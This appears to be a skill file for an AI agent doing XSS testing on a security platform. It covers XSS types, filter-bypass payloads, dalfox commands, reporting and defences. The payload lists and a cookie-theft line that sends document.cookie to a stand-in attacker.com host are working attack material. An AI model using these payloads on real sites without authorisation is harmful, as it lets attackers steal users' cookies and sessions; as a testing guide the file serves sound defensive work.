---
name: xss-testing
description: Specialized techniques for cross-site scripting (XSS) testing
version: 1.0.0
---

# XSS Testing

## Overview

Cross-site scripting (XSS) lets an attacker execute malicious JavaScript in the victim's browser. This skill covers testing approaches for reflected, stored, and DOM-based XSS.

## XSS Types

### 1. Reflected XSS
- The malicious script is passed via URL parameters
- The server returns a response containing the script
- Requires the user to click a crafted link

### 2. Stored XSS
- The malicious script is persisted on the server (database, files, etc.)
- Every user visiting the affected page executes the script
- Has a broader impact

### 3. DOM-based XSS
- Client-side JavaScript handles user input improperly
- No server-side processing involved
- Triggered by DOM manipulation

## Testing Methodology

### Basic Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Filter Bypasses

#### Case variation
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### Encoding bypass
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### Event handlers
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### Pseudo-protocols
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### Advanced Bypass Techniques

#### String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### eval and atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### HTML entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## Tool Usage

### dalfox
```bash
# Basic scan
dalfox url "http://target.com/page?q=test"

# Target a specific parameter
dalfox url "http://target.com/page" -d "q=test" -X POST

# Use custom payloads
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- Use Intruder for batch testing
- Use Repeater for manual testing
- Use Scanner for automated detection

### Browser Console
- Test DOM-based XSS
- Inspect the JavaScript execution environment
- Debug payloads

## Verification and Exploitation

### Verification Steps
1. Confirm the payload executes
2. Check whether it is filtered or encoded
3. Test different contexts (HTML, JavaScript, attributes, etc.)
4. Assess the impact (cookie theft, session hijacking, etc.)

### Exploitation Scenarios
- Cookie theft: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- Keylogging: inject keyboard event listeners
- Phishing: forge a login form
- Session hijacking: steal the user's session token

## Reporting Essentials

- XSS type (reflected/stored/DOM)
- Trigger location and affected parameters
- Complete PoC
- Impact assessment
- Remediation advice (output encoding, CSP policy, etc.)
- Submit confirmed findings to the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform)

## Protective Measures

- Input validation and filtering
- Output encoding (HTML, JavaScript, URL)
- Content Security Policy (CSP)
- HttpOnly cookie flag
- Use secure frameworks and libraries
